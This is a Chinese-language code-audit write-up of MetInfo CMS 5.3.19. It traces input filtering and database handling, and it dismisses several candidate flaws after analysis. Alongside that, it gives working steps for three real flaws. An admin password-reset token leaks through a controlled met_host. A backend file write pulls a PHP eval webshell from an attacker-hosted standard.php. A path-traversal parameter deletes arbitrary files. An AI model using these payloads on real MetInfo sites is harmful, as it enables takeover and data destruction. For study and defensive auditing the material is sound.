## 前言

**最近在学习代码审计，就想着拿个CMS来练练手，然后选择了MetInfo5.3.19，来一次完整的代码审计，并把审计的思路都写下来。审计过程把可能存在漏洞但做了防护的地方也分析了，所以篇幅比较长。第一次写，可能不太好，有问题的地方还望大佬们指出。**

## 审计过程

代码审计的大致过程就是先看看帮助文档，然后打开网站随便点点看url对应的文件目录（如果是MVC架构就要搞清楚路由方式）；了解cms的传参过程和数据库操作过程；审计一些明显的交互点对应的代码（比如留言板，登录框）；将Seay自动审计后的结果验证一下，虽然自动审计的误报率高，但是不容易漏，就是比较需要耐心。

## 准备工作

工具：phpstudy，phpstorm（安装xdebug插件），Seay源码审计系统，burpsuite，米拓cms帮助文档：<https://doc.metinfo.cn/dev/basics/basics28.html>

打开帮助文档看看里面的东西，比如文件结构、系统常量什么的，在里面可以注意到一个$_M,`$_M[form]`：提交的GET,POST,COOKIE表单数组。在系统中不要直接使用$_POST,$_GET,$_COOKIE,这些都是没有过滤的，`$_M[form]`中是已经安全过滤后的数组。通过这里可以知道传参都会经过过滤后保存在$_M里面

## 0x01 了解cms传参过程

先随便找一个有进行传参的地方，比如前台‘公司动态’的文章，通过url：[http://127.0.0.1:8006/news/shownews.php?lang=cn&id=1](http://127.0.0.1:8006/news/shownews.php?lang=cn&id=1)，跟进对应的目录news/shownews.php

![](https://image.3001.net/images/20200427/1587989650_5ea6cc92ca5ba.png!small)

这里没有传参的函数，但是开头就包含了include/common.inc.php，继续跟进这个文件，发现里面就有段传参的代码

    
    
    foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
     foreach($$_request as $_key => $_value) {
     $_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);
     $_M['form'][$_key] = daddslashes($_value,0,0,1);
     }
    }
    

大概意思就是将$_GET,$_POST,$_COOKIE传入的参数进行键值分离，然后再将参数值经过daddslashes($_value,0,0,1)函数进行过滤，将过滤后的值赋值给$_M，可以确定这里就是处理传入参数的地方，然后新建一个1.php文件进行测试

在第一行下断点，通过1.php传参a=1’，然后跟进daddslashes()函数

![](https://image.3001.net/images/20200427/1587989702_5ea6ccc696ca9.png!small)

这里可以看到有好几个文件都有定义daddslashes()函数，这时phpstorm的强大之处就体现出来了，用它的调试功能可以直接直接跟进定义这里的daddslashes()函数的文件

跟进到include/global.fun.php，部分代码如下

    
    
    //daddslashes('a'',0,0,1)
    function daddslashes($string, $force = 0,$metinfo,$url = 0) {
    global $met_sqlinsert,$id,$class1,$class2,$class3;
     !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
     if(!MAGIC_QUOTES_GPC || $force) {
     if(is_array($string)) {
     foreach($string as $key => $val) {
     $string[$key] = daddslashes($val, $force);
     }
     //判断$string是否为数组，如果是，继续键值分离
     } else {
     $string = addslashes($string);
     }
     //如果不是，通过addslashes()函数进行转义
     }
     if(is_array($string)){
     if($url){
     $string='';
     }else{
     foreach($string as $key => $val) {
     $string[$key] = daddslashes($val, $force);
     }
     //如果$string是数组，并且$url的值为1，将$string置空,$url不为0则进行键值分离
     }
     }else{
     //如果$string不是数组，进行下面的替换（不区分大小写），从这里可以看出，sql注入就基本被过滤了
     $string_old = $string;
     $string = str_ireplace("\"","/",$string);
     $string = str_ireplace("'","/",$string);
     $string = str_ireplace("*","/",$string);
     $string = str_ireplace("~","/",$string);
     $string = str_ireplace("select", "\sel\ect", $string);
     $string = str_ireplace("insert", "\ins\ert", $string);
     $string = str_ireplace("update", "\up\date", $string);
     $string = str_ireplace("delete", "\de\lete", $string);
     $string = str_ireplace("union", "\un\ion", $string);
     $string = str_ireplace("into", "\in\to", $string);
     $string = str_ireplace("load_file", "\load\_\file", $string);
     $string = str_ireplace("outfile", "\out\file", $string);
     $string = str_ireplace("sleep", "\sle\ep", $string);
    
     $string_html=$string;
     $string = strip_tags($string);
     //strip_tags()剥去字符串中的 HTML、XML 以及 PHP 的标签
     if($string_html!=$string){
     $string='';
     //如果剥去了标签，那么该if语句成立，$string就会变为空，所以这里也基本过滤了xss和写入php文件
     }
     $string = str_replace("%", "\%", $string); 
     if(strlen($string_old)!=strlen($string)&&$met_sqlinsert){
     $reurl="http://".$_SERVER["HTTP_HOST"];
     echo("<script type='text/javascript'> alert('Submitted information is not legal!'); location.href='$reurl'; </script>");
     die("Parameter Error！");
     }
     $string = trim($string);
     }
    

## 0x02 了解数据库操作

还是看到news/shownews.php，在为$dbname赋值后就包含了/include/global/showmod.php，所以这文件里可能就有数据库操作语句

![](https://image.3001.net/images/20200427/1587989868_5ea6cd6ca5ec8.png!small)

跟踪进去后发现通过get_one(‘sql语句’)进行数据库操作

跟进get_one()函数进入include/mysql_class.php，发现这是定义数据库操作方法的文件，增删改查都在这里

![](https://image.3001.net/images/20200427/1587989888_5ea6cd8037e47.png!small)

get_one()函数构造好sql语句后，就调用$this->query($sql,$type)方法

![](https://image.3001.net/images/20200427/1587989901_5ea6cd8d95488.png!small)

通过调试跟进可以看到$func=‘mysql_query’，然后执行了$query = $func($sql, $this->link)，进行数据库操作

增删改也是跟查一样，构造好sql语句赋值给$sql，然后调用$this->query()方法进行数据库操作

![](https://image.3001.net/images/20200427/1587989912_5ea6cd98653f5.png!small)

## 0x03 漏洞分析

了解了cms的传参过程和数据库操作过程后，就可以着手分析哪有漏洞了，首先是看一些明显的用户交互处（比如留言板，登录框）对应的代码段，然后用Seay源码审计系统的自动审计，验证漏洞。由于从前面了解了传参的过滤方式，所以基本可以确定留言板和登录框是没有注入和xss的，而前台只有留言板这一个交互点，所以就把目光放到后台上。

## 0x04 管理员密码重置

后台登录界面有个‘忘记密码’，对应的文件是admin/admin/getpassword.php

直接找update语句，找到了两处更新管理员表的地方，并且都是在$action=‘next4’后

### 第一处

![](https://image.3001.net/images/20200427/1587989925_5ea6cda5739d8.png!small)

$abt_type的值可以通过post传参得到，所以很容易满足

从后往前推，update语句where的条件是admin_id=$cndes[2]，而要执行update语句，要让

    
    
    if($password=='')okinfo('javascript:history.back();',$lang_dataerror); 
    
    if($passwordsr!=$password)okinfo('javascript:history.back();',$lang_js6);

这两个if语句为假，即要传入不为空的$password和与$password相等的$passwordsr，这两通过post传入也很容易满足

然后就是if($codeok)成立，

    
    
    $codeok = $db->get_one("SELECT * FROM $met_otherinfo WHERE authpass='$cnde' and lang='met_cnde'");

$codeok的值要通过查询met_otherinfo表，而条件为authpass=$cnde，但是看到met_otherinfo表发现authpass字段没有数据

![](https://image.3001.net/images/20200427/1587989936_5ea6cdb0da758.png!small)

所以猜想可能在前面会有将数据插入authpass字段的地方，往前搜索authpass找到了一段代码

在$action=next2且abt_type==1后

![](https://image.3001.net/images/20200427/1587989945_5ea6cdb9ef00b.png!small)

执行这段代码的前提是$smsok==‘SUCCESS’，而

    
    
    $smsok=sendsms($admin_list['admin_mobile'],$message,5);
    

![](https://image.3001.net/images/20200427/1587989953_5ea6cdc182459.png!small)

sendsms()为发送短信的方法，我没有开通发送短信，所以$authpass无法插入数据，那么if($codeok)就无法成立，后面的update语句也没法执行了，所以这一处没法绕过。

### 第二处

还是$action=next4后，但是abt_type的值不能为1

![](https://image.3001.net/images/20200427/1587989963_5ea6cdcbd2c58.png!small)

这里最关键的是if(!$p)die();$p要有值才能执行后面的update语句，传入$p后会对$p进行处理，处理的代码还是在该页面里

    
    
    if($p){
     $array = explode('.',authcode($p,'DECODE', $met_webkeys));
     $array[0]=daddslashes($array[0]);
     $sql="SELECT * FROM $met_admin_table WHERE admin_id='".$array[0]."'";
     //从这sql语句可得$array[0]必须为要修改的密码对应的用户名
     $sqlarray = $db->get_one($sql);
     $passwords=$sqlarray[admin_pass];
     $checkCode = md5($array[0].'+'.$passwords);
     if($array[1]!=$checkCode){
     okinfo('../admin/getpassword.php',$lang_dataerror);
     }
     if(!$action){
     $action='next3';
     $abt_type=2;
     $nbers[1]=$sqlarray[admin_id];
     }
    }
    

还是从后往前推

    
    
    if($array[1]!=$checkCode){
     okinfo('../admin/getpassword.php',$lang_dataerror);
     }
    

必须让$array[1]=$checkCode才能往下执行，$array为$p解密后经过explode()函数得来，explode('.',authcode($p,'DECODE',
$met_webkeys))以‘.’作为分隔符将解密后的$p分割后组成数组。$checkCode =
md5($array[0].'+'.$passwords)，$passwords =
$sqlarray[admin_pass];，$passwords为管理员表中用户名对应的密码的值。所以可以得出$array[1]的值必须为md5(用户名+密码)，$array[0]的值为用户名，所以authcode($p,’DECODE’,
$met_webkeys)的值为用户名.md5(用户名+密码)。所以如果能找到加密这个值并且能得到它的地方，那么就可以构造出满足条件的$p，达到任意修改密码的目的。

通过全局搜索发现还真有这地方

![](https://image.3001.net/images/20200427/1587989974_5ea6cdd638507.png!small)

跟进后发现还是在getpassword.php这个文件下

执行的前提是$action=next2，$abt_type!=1，admin_mobile=存在的用户名

![](https://image.3001.net/images/20200427/1587989984_5ea6cde02ddca.png!small)

最后是将这串满足条件的加密值赋值给了$String，然后$mailurl的值又拼接了‘p=$String’

但是$mailurl最后出现的地方是在往下几十行的$body .="<p><a href='$mailurl'>$mailurl</a></p>\n";，

构造参数发送数据包后显示如下

![](https://image.3001.net/images/20200427/1587989995_5ea6cdeb066ec.png!small)

$mailurl的值并没有输出出来

后来百度了后才知道还得GET传参met_host=公网ip，然后公网ip的主机监听80端口，并捕获该端口上的HTTP流量，才能得到$mailurl的值，就像这样

![](https://image.3001.net/images/20200427/1587990005_5ea6cdf55210f.png!small)

（此图来源百度）

但是找不到分析漏洞成因的文章，只有复现的文章，我也不知道为啥公网ip监听后就能得到这个$mailurl

## 0x05 后台cookie欺骗（不存在）

登录后台后发现有如下cookie

![](https://image.3001.net/images/20200427/1587990041_5ea6ce1980351.png!small)

经测试后发现met_auth和met_key这两个值要都存在才能访问后台，少了任意一个都会跳转到登录界面，于是全局搜索看看这两个是哪来的

![](https://image.3001.net/images/20200427/1587990054_5ea6ce260e9b7.png!small)

![](https://image.3001.net/images/20200427/1587990061_5ea6ce2dbc185.png!small)

$met_key=met_rand(7);rand？嗯，打扰了…

## 0x06 后台文件上传（不存在）

在后台发布内容处发现有一个上传点

![](https://image.3001.net/images/20200427/1587990077_5ea6ce3de78dc.png!small)

上传对应的数据包如下

![](https://image.3001.net/images/20200427/1587990088_5ea6ce4891eba.png!small)

url为/admin/index.php?c=uploadify&m=include&a=doupimg⟨=cn&data_key=undefined

这种url的传参有点像MVC架构的传参方式，url对应的文件为app/system/include/uploadify.class.php，方法名为doupimg()

如果不知道url对应的文件位置，就可以用phpstorm的调试一步步跟进，最后就能跟到对应文件位置

![](https://image.3001.net/images/20200427/1587990098_5ea6ce5262dcc.png!small)

根据返回值来跟踪函数，这个函数返回的是$back，$back又是经过upimg()函数得来，所以继续跟进upimg()

![](https://image.3001.net/images/20200427/1587990118_5ea6ce66bf5e6.png!small)

跟进upload()

![](https://image.3001.net/images/20200427/1587990128_5ea6ce7034e5d.png!small)

跟进upfile->upload()

    
    
    public function upload($form = '') {
     global $_M;
     if($form){
     foreach($_FILES as $key => $val){
     if($form == $key){
     $filear = $_FILES[$key];
     }
     }
     }
     if(!$filear){
     foreach($_FILES as $key => $val){
     $filear = $_FILES[$key];
     break;
     }
     }
     //是否能正常上传
     if(!is_array($filear))$filear['error'] = 4;
     if($filear['error'] != 0 ){
     $errors = array(
     0 => $_M['word']['upfileOver4'], 
     1 => $_M['word']['upfileOver'], 
     2 => $_M['word']['upfileOver1'], 
     3 => $_M['word']['upfileOver2'], 
     4 => $_M['word']['upfileOver3'], 
     6 => $_M['word']['upfileOver5'], 
     7 => $_M['word']['upfileOver5']
     );
     $error_info[]= $errors[$filear['error']] ? $errors[$filear['error']] : $errors[0];
     return $this->error($errors[$filear['error']]);
     }
     //文件大小是否正确
     if ($filear["size"] > $this->maxsize || $filear["size"] > $_M['config']['met_file_maxsize']*1048576) {
     return $this->error("{$_M['word']['upfileFile']}".$filear["name"]." {$_M['word']['upfileMax']} {$_M['word']['upfileTip1']}");
     }
     //文件后缀是否为合法后缀
     $this->getext($filear["name"]); //获取允许的后缀
     if (strtolower($this->ext)=='php'||strtolower($this->ext)=='aspx'||strtolower($this->ext)=='asp'||strtolower($this->ext)=='jsp'||strtolower($this->ext)=='js'||strtolower($this->ext)=='asa') {
     return $this->error($this->ext." {$_M['word']['upfileTip3']}");
     }
     if ($_M['config']['met_file_format']) {
     if($_M['config']['met_file_format'] != "" && !in_array(strtolower($this->ext), explode('|',strtolower($_M['config']['met_file_format']))) && $filear){ 
     return $this->error($this->ext." {$_M['word']['upfileTip3']}");
     }
     } else {
     return $this->error($this->ext." {$_M['word']['upfileTip3']}");
     }
     if ($this->format) {
     if ($this->format != "" && !in_array(strtolower($this->ext), explode('|',strtolower($this->format))) && $filear) { 
     return $this->error($this->ext." {$_M['word']['upfileTip3']}");
     }
     }
    

检测的关键代码如下

![](https://image.3001.net/images/20200427/1587990138_5ea6ce7a12bc7.png!small)

第一个if语句是黑名单检测，不允许有php，asp等文件名后缀

第二个if语句是白名单检测，文件名后缀只能是$_M['config']['met_file_format']中的值，这些值为

![](https://image.3001.net/images/20200427/1587990160_5ea6ce904b27a.png!small)

都是不区分大小写，所以到这里就可以确定没有上传漏洞了，因为是本地搭建的网站，所以不考虑解析漏洞

## 0x07 自动审计

前面分析的都是一些明显的用户交互的界面，接下来就用自动审计继续找漏洞

![](https://image.3001.net/images/20200427/1587990170_5ea6ce9a3533a.png!small)

自动审计结果又1000多条，所以得挑着看，比如前面分析过的传参的过滤，就可以不用看sql注入了

![](https://image.3001.net/images/20200427/1587990177_5ea6cea18da36.png!small)

或者像这样虽然有危险函数eval()，但是函数里又不止一个变量，那么就很难控制eval()里面只有我们想执行的语句，所以也不看。如果eval()内只有一个变量，那么就可以去看看会不会有漏洞

## 0x08 X-FORWARDED-FOR头注入（不存在）

翻着翻着就发现了一处sql注入，但这是用$_SERVER接收参数的，前面分析的传参都是过滤了get，post，cookie，但没有过滤$_SERVER，所以可以看看这个地方

![](https://image.3001.net/images/20200427/1587990184_5ea6cea84d967.png!small)

找到一处会记录客户端ip地址的地方，留言板，所以就在这里测试

![](https://image.3001.net/images/20200427/1587990191_5ea6ceaf15b42.png!small)

![](https://image.3001.net/images/20200427/1587990203_5ea6cebba4f70.png!small)

改了x-forwarded-for头后，伪造的ip确实已经插入数据库

然后将x-forwarded-for改为192.168.1.1’ and 1=2 #，发包后调试跟踪

跟踪到include/common.inc.php文件下，发现还是有对ip做检测的

![](https://image.3001.net/images/20200427/1587990219_5ea6cecbd7cd7.png!small)

用了正则表达式检测ip，如果不是(1~3个数字)xxx.xxx.xxx.xxx这样的ip地址格式，那么就会把$_SERVER[‘REMOTE_ADDR’]的值赋值给$m_user_ip，百度后发现REMOTE_ADDR头是无法伪造的，所以这处x-forwarded-for头注入也就没有了。

## 0x09 后台文件写入

继续看自动审计，发现了一处可能有任意文件写入的地方

![](https://image.3001.net/images/20200427/1587990233_5ea6ced94e972.png!small)

![](https://image.3001.net/images/20200427/1587990247_5ea6cee7b5292.png!small)

    
    
    $results=explode('<Met>',$result);

$results是由$result经过explode()以‘<Met>’作为分隔符分割组成的数组，如果$result的值可控，那么就可以写入我们想写入的内容了，$result=curl_post($post,60);跟踪进入curl_post()函数，在include/export.func.php文件下

![](https://image.3001.net/images/20200427/1587990259_5ea6cef3ddad7.png!small)

$result=curl_exec($curlHandle);但是这个curl是什么玩意咱也不知道，就去百度看看，大致了解了curl后得出的结论就是主要代码是这三句

    
    
    curl_setopt($curlHandle,CURLOPT_URL,'http://'.$host.$file);
    
    curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1);
    
    $result=curl_exec($curlHandle);

第一句是设置url为[http://$host.$file](https://www.freebuf.com/wp-admin/post.php?post=235093&action=edit)而

$host=$met_host;

$file=$met_file;

$met_host和$met_file都是全局变量，那就试试能不能传参修改这两变量的值

![](https://image.3001.net/images/20200427/1587990270_5ea6cefe7a533.png!small)

![](https://image.3001.net/images/20200427/1587990281_5ea6cf093e7b8.png!small)

调试后发现$met_host可以控制，$met_file不行，$met_file=/dl/standard.php

第二、三句是获取前面设置的url的页面内容，然后赋值给$result，所以只要在公网ip下创建一个dl文件夹，里面再创建一个standard.php，然后就会执行这个php文件，并将执行结果赋值给$result，接下来试验一下

我在虚拟机上创建了这个standard.php文件

![](https://image.3001.net/images/20200427/1587990289_5ea6cf114e146.png!small)

然后将数据包的met_host改为虚拟机ip

![](https://image.3001.net/images/20200427/1587990300_5ea6cf1c8952c.png!small)

发包，phpstorm下断

![](https://image.3001.net/images/20200427/1587990307_5ea6cf23f22d4.png!small)

可以看到此时$result的值为111了

然后继续往下看，发现还有个检测$result值的地方

![](https://image.3001.net/images/20200427/1587990317_5ea6cf2d7ec2c.png!small)

就是$result的开头必须是‘metinfo’，这个好搞

然后结合前面分析的$results的由来

    
    
    $results=explode('<Met>',$result);file_put_contents('dlappfile.php',$results[1]);

用<Met>隔开，并且让$results[1]的值为一句话木马

这样就可以构造虚拟机下的standard.php的内容

    
    
    metinfo<Met><?php echo '<?php@eval($_REQUEST[\'a\'])?>'; ?><Met><?php echo '111';?>

![](https://image.3001.net/images/20200427/1587990325_5ea6cf3573357.png!small)

然后发包，下断

![](https://image.3001.net/images/20200427/1587990336_5ea6cf40df12e.png!small)

可以看到$results[1]的值已经为一句话木马了

接着访问dlappfile.php文件，写入成功

![](https://image.3001.net/images/20200427/1587990355_5ea6cf536add3.png!small)

## 0x10 后台文件删除

继续翻，翻到了一个地方unlink()函数下只有一个变量

![](https://image.3001.net/images/20200427/1587990371_5ea6cf639cef9.png!small)

于是打开看看

![](https://image.3001.net/images/20200427/1587990378_5ea6cf6a3bffc.png!small)

（这里unlink()这段代码原来是[@unlink](https://github.com/unlink)($f_filename);这样的，为了方便测试我就加上了个‘echo’）

追踪$f_filename，在这个文件下并没有发现给$_filename赋值的地方，那么就给它传个参数看看

![](https://image.3001.net/images/20200427/1587990386_5ea6cf720c0c1.png!small)

![](https://image.3001.net/images/20200427/1587990394_5ea6cf7a6ca65.png!small)

成功传入，之前的分析的传参过滤并没有发现会过滤../ ，那么就可以做到任意文件删除了

接下来测试一下，在admin/app/physical/目录下创建一个1.txt，然后$f_filename传参‘1.txt’，结果成功删除

![](https://image.3001.net/images/20200427/1587990402_5ea6cf828baa8.png!small)

再在根目录下创建一个1.txt，$f_filename传参‘../../../1.txt’，还是成功删除

![](https://image.3001.net/images/20200427/1587990409_5ea6cf89795dd.png!small)

审计结束！

## 结语

目前的审计思路大概就是这样，随着以后的学习可能还会变化。这代码审计学了差不多有一个月了，给我的感受就是对漏洞的成因和防护有了更深的理解。比如以前只是知道sql注入的原因是对用户输入的参数没有进行严格检查，导致参数带入数据进行拼接，执行恶意的sql语句，然后看到?id=1就尝试注入，结果页面没什么反应我也不知道为什么，看了一些cms的传参过滤和数据库操作后，才知道网站对sql注入防御的完整过程。所以我觉得学好代码审计还是很有必要的。

 ***本文作者：阔诺dio哒，转载请注明来自FreeBuf.COM**

